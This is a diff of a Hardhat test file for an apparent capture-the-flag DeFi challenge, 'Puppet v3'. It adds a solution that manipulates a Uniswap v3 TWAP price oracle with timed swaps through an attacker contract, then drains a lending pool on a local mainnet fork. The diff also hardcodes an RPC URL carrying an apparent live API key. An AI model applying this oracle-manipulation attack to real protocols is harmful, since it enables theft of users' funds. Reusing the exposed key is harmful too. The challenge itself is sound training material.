@@ -1,6 +1,9 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
-const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
+const {
+  time,
+  setBalance,
+} = require("@nomicfoundation/hardhat-network-helpers");
 
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
@@ -10,152 +13,386 @@ const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol
 const bn = require("bignumber.js");
 bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
 function encodePriceSqrt(reserve0, reserve1) {
-    return ethers.BigNumber.from(
-        new bn(reserve1.toString())
-            .div(reserve0.toString())
-            .sqrt()
-            .multipliedBy(new bn(2).pow(96))
-            .integerValue(3)
-            .toString()
-    )
+  return ethers.BigNumber.from(
+    new bn(reserve1.toString())
+      .div(reserve0.toString())
+      .sqrt()
+      .multipliedBy(new bn(2).pow(96))
+      .integerValue(3)
+      .toString()
+  );
 }
 
-describe('[Challenge] Puppet v3', function () {
-    let deployer, player;
-    let uniswapFactory, weth, token, uniswapPositionManager, uniswapPool, lendingPool;
-    let initialBlockTimestamp;
+describe("[Challenge] Puppet v3", function () {
+  let deployer, player;
+  let uniswapFactory,
+    weth,
+    token,
+    uniswapPositionManager,
+    uniswapPool,
+    lendingPool;
+  let initialBlockTimestamp;
 
-    /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+  /** SET RPC URL HERE */
+  const MAINNET_FORKING_URL =
+    "https://eth-mainnet.g.alchemy.com/v2/y8aokhML52A8PH4-mIh2Rlfwb17ar0Lc";
 
-    // Initial liquidity amounts for Uniswap v3 pool
-    const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
-    const UNISWAP_INITIAL_WETH_LIQUIDITY = 100n * 10n ** 18n;
+  // Initial liquidity amounts for Uniswap v3 pool
+  const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
+  const UNISWAP_INITIAL_WETH_LIQUIDITY = 100n * 10n ** 18n;
 
-    const PLAYER_INITIAL_TOKEN_BALANCE = 110n * 10n ** 18n;
-    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
-    const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;
+  const PLAYER_INITIAL_TOKEN_BALANCE = 110n * 10n ** 18n;
+  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
+  const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;
 
-    const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
+  const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
-        // Fork from mainnet state
-        await ethers.provider.send("hardhat_reset", [{
-            forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 }
-        }]);
+    // Fork from mainnet state
+    await ethers.provider.send("hardhat_reset", [
+      {
+        forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 },
+      },
+    ]);
 
-        // Initialize player account
-        // using private key of account #2 in Hardhat's node
-        player = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider);
-        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
-        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
+    // Initialize player account
+    // using private key of account #2 in Hardhat's node
 
-        // Initialize deployer account
-        // using private key of account #1 in Hardhat's node
-        deployer = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", ethers.provider);
-        await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
-        expect(await ethers.provider.getBalance(deployer.address)).to.eq(DEPLOYER_INITIAL_ETH_BALANCE);
+    player = new ethers.Wallet(
+      "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
+      ethers.provider
+    );
+    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
+    expect(await ethers.provider.getBalance(player.address)).to.eq(
+      PLAYER_INITIAL_ETH_BALANCE
+    );
 
-        // Get a reference to the Uniswap V3 Factory contract
-        uniswapFactory = new ethers.Contract("0x1F98431c8aD98523631AE4a59f267346ea31F984", factoryJson.abi, deployer);
+    // Initialize deployer account
+    // using private key of account #1 in Hardhat's node
+    deployer = new ethers.Wallet(
+      "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
+      ethers.provider
+    );
+    await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
+    expect(await ethers.provider.getBalance(deployer.address)).to.eq(
+      DEPLOYER_INITIAL_ETH_BALANCE
+    );
 
-        // Get a reference to WETH9
-        weth = (await ethers.getContractFactory('WETH', deployer)).attach("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");
+    // Get a reference to the Uniswap V3 Factory contract
+    uniswapFactory = new ethers.Contract(
+      "0x1F98431c8aD98523631AE4a59f267346ea31F984",
+      factoryJson.abi,
+      deployer
+    );
 
-        // Deployer wraps ETH in WETH
-        await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
-        expect(await weth.balanceOf(deployer.address)).to.eq(UNISWAP_INITIAL_WETH_LIQUIDITY);
+    // Get a reference to WETH9
+    weth = (await ethers.getContractFactory("WETH", deployer)).attach(
+      "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
+    );
 
-        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
-        // Create the Uniswap v3 pool
-        uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
-        const FEE = 3000; // 0.3%
-        await uniswapPositionManager.createAndInitializePoolIfNecessary(
-            weth.address,  // token0
-            token.address, // token1
-            FEE,
-            encodePriceSqrt(1, 1),
-            { gasLimit: 5000000 }
-        );
+    // Deployer wraps ETH in WETH
+    await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
+    expect(await weth.balanceOf(deployer.address)).to.eq(
+      UNISWAP_INITIAL_WETH_LIQUIDITY
+    );
 
-        let uniswapPoolAddress = await uniswapFactory.getPool(
-            weth.address,
-            token.address,
-            FEE
-        );
-        uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
-        await uniswapPool.increaseObservationCardinalityNext(40);
-        
-        // Deployer adds liquidity at current price to Uniswap V3 exchange
-        await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
-        await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
-        await uniswapPositionManager.mint({
-            token0: weth.address,
-            token1: token.address,
-            tickLower: -60,
-            tickUpper: 60,
-            fee: FEE,
-            recipient: deployer.address,
-            amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
-            amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
-            amount0Min: 0,
-            amount1Min: 0,
-            deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+    // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
 
-        // Deploy the lending pool
-        lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
-            weth.address,
-            token.address,
-            uniswapPool.address
-        );
+    // Create the Uniswap v3 pool
+    uniswapPositionManager = new ethers.Contract(
+      "0xC36442b4a4522E871399CD717aBDD847Ab11FE88",
+      positionManagerJson.abi,
+      deployer
+    );
+    const FEE = 3000; // 0.3%
+    await uniswapPositionManager.createAndInitializePoolIfNecessary(
+      weth.address, // token0
+      token.address, // token1
+      FEE,
+      encodePriceSqrt(1, 1),
+      { gasLimit: 5000000 }
+    );
 
-        // Setup initial token balances of lending pool and player
-        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await token.transfer(lendingPool.address, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    let uniswapPoolAddress = await uniswapFactory.getPool(
+      weth.address,
+      token.address,
+      FEE
+    );
+    uniswapPool = new ethers.Contract(
+      uniswapPoolAddress,
+      poolJson.abi,
+      deployer
+    );
+    await uniswapPool.increaseObservationCardinalityNext(40);
 
-        // Some time passes
-        await time.increase(3 * 24 * 60 * 60); // 3 days in seconds
+    // Deployer adds liquidity at current price to Uniswap V3 exchange
+    await weth.approve(
+      uniswapPositionManager.address,
+      ethers.constants.MaxUint256
+    );
+    await token.approve(
+      uniswapPositionManager.address,
+      ethers.constants.MaxUint256
+    );
+    await uniswapPositionManager.mint(
+      {
+        token0: weth.address,
+        token1: token.address,
+        tickLower: -60,
+        tickUpper: 60,
+        fee: FEE,
+        recipient: deployer.address,
+        amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
+        amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
+        amount0Min: 0,
+        amount1Min: 0,
+        deadline: (await ethers.provider.getBlock("latest")).timestamp * 2,
+      },
+      { gasLimit: 5000000 }
+    );
 
-        // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
-        // To borrow 1 DVT, must deposit 3 ETH
-        expect(
-            await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n)
-        ).to.be.eq(3n * 10n ** 18n);
+    // Deploy the lending pool
+    lendingPool = await (
+      await ethers.getContractFactory("PuppetV3Pool", deployer)
+    ).deploy(weth.address, token.address, uniswapPool.address);
 
-        // To borrow all DVT in lending pool, user must deposit three times its value
-        expect(
-            await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
-        ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);
+    // Setup initial token balances of lending pool and player
+    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    await token.transfer(
+      lendingPool.address,
+      LENDING_POOL_INITIAL_TOKEN_BALANCE
+    );
 
-        // Ensure player doesn't have that much ETH
-        expect(await ethers.provider.getBalance(player.address)).to.be.lt(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);
+    // Some time passes
+    await time.increase(3 * 24 * 60 * 60); // 3 days in seconds
 
-        initialBlockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
+    // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
+    // To borrow 1 DVT, must deposit 3 ETH
+    expect(
+      await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n)
+    ).to.be.eq(3n * 10n ** 18n);
+
+    // To borrow all DVT in lending pool, user must deposit three times its value
+    expect(
+      await lendingPool.calculateDepositOfWETHRequired(
+        LENDING_POOL_INITIAL_TOKEN_BALANCE
+      )
+    ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);
+
+    // Ensure player doesn't have that much ETH
+    expect(await ethers.provider.getBalance(player.address)).to.be.lt(
+      LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n
+    );
+
+    initialBlockTimestamp = (await ethers.provider.getBlock("latest"))
+      .timestamp;
+  });
+
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    //WETH-token0="0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
+    //DVT-token1="0xdF46e54aAadC1d55198A4a8b4674D7a4c927097A"
+    //Swap DVT for ETH - OneForZero
+    /**Step1: Deployment */
+    const PuppetV3Attacker = await ethers.getContractFactory(
+      "PuppetV3Attacker"
+    );
+    const puppetV3Attacker = await PuppetV3Attacker.deploy(
+      token.address,
+      uniswapPool.address,
+      lendingPool.address,
+      weth.address
+    );
+    console.log("puppetV3Attacker is deployed at", puppetV3Attacker.address);
+    await token
+      .connect(player)
+      .transfer(puppetV3Attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    console.log(
+      "puppetV3Attacker token balance is",
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      ),
+      "\n____________________________________________________",
+      "\nRepeated swapping token for Weth..."
+    );
+    /** Step2: Repeated swapping with time increments */
+    await puppetV3Attacker.callSwap1(ethers.utils.parseEther("100"), {
+      gasLimit: 3000000,
     });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(12);
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    await puppetV3Attacker.callSwap2(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
     });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(13);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-
-        // Block timestamp must not have changed too much
-        expect(
-            (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
-        ).to.be.lt(115, 'Too much time passed');
-
-        // Player has taken all tokens out of the pool        
-        expect(
-            await token.balanceOf(lendingPool.address)
-        ).to.be.eq(0);
-        expect(
-            await token.balanceOf(player.address)
-        ).to.be.gte(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    await puppetV3Attacker.callSwap3(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
     });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(13);
+
+    await puppetV3Attacker.callSwap4(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
+    });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(13);
+
+    await puppetV3Attacker.callSwap5(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
+    });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(13);
+
+    await puppetV3Attacker.callSwap6(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
+    });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(15);
+
+    await puppetV3Attacker.callSwap7(ethers.utils.parseEther("1"), {
+      gasLimit: 3000000,
+    });
+    console.log(
+      ethers.utils.formatEther(
+        (await weth.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    console.log(
+      ethers.utils.formatEther(
+        (await token.balanceOf(puppetV3Attacker.address)).toString()
+      )
+    );
+    await time.increase(13);
+    await puppetV3Attacker.getQuoteFromPool(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    amountIn = await puppetV3Attacker.amountIn();
+    console.log(
+      ethers.utils.formatEther(amountIn.toString()),
+      "\n____________________________________________________"
+    );
+
+    /**Step 3: Transfer Weth from attacker contract to player and borrow from pool */
+    await puppetV3Attacker.connect(player).transferWeth();
+
+    await weth
+      .connect(player)
+      .approve(lendingPool.address, ethers.utils.parseEther("99"));
+
+    await lendingPool
+      .connect(player)
+      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+    console.log(
+      `Seconds lapsed since execution starts`,
+      (await ethers.provider.getBlock("latest")).timestamp -
+        initialBlockTimestamp
+    );
+    // Check the pool status for references
+    await puppetV3Attacker.observePool([600, 0]);
+    console.log(
+      "tickCumulatives at 10min agao",
+      (await puppetV3Attacker.tickCumulatives(0)).toString()
+    );
+    console.log(
+      "tickCumulatives now",
+      (await puppetV3Attacker.tickCumulatives(1)).toString()
+    );
+
+    console.log(
+      "Weth balance in UniswapPool",
+      ethers.utils.formatEther(
+        (await weth.balanceOf(uniswapPool.address)).toString()
+      )
+    );
+    console.log(
+      "Token balance in UniswapPool",
+      ethers.utils.formatEther(
+        (await token.balanceOf(uniswapPool.address)).toString()
+      )
+    );
+    //For reference: calculate spot price based on ratio of token balances
+    let x = (await weth.balanceOf(uniswapPool.address)).toString();
+    let y = (await token.balanceOf(uniswapPool.address)).toString();
+    console.log(
+      "Ref: Quote of 1million token from lending pool in Weth (based on ratio of token balances):",
+      (1000000 * x) / y
+    );
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Block timestamp must not have changed too much
+    expect(
+      (await ethers.provider.getBlock("latest")).timestamp -
+        initialBlockTimestamp
+    ).to.be.lt(115, "Too much time passed");
+
+    // Player has taken all tokens out of the pool
+    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);
+    expect(await token.balanceOf(player.address)).to.be.gte(
+      LENDING_POOL_INITIAL_TOKEN_BALANCE
+    );
+  });
 });
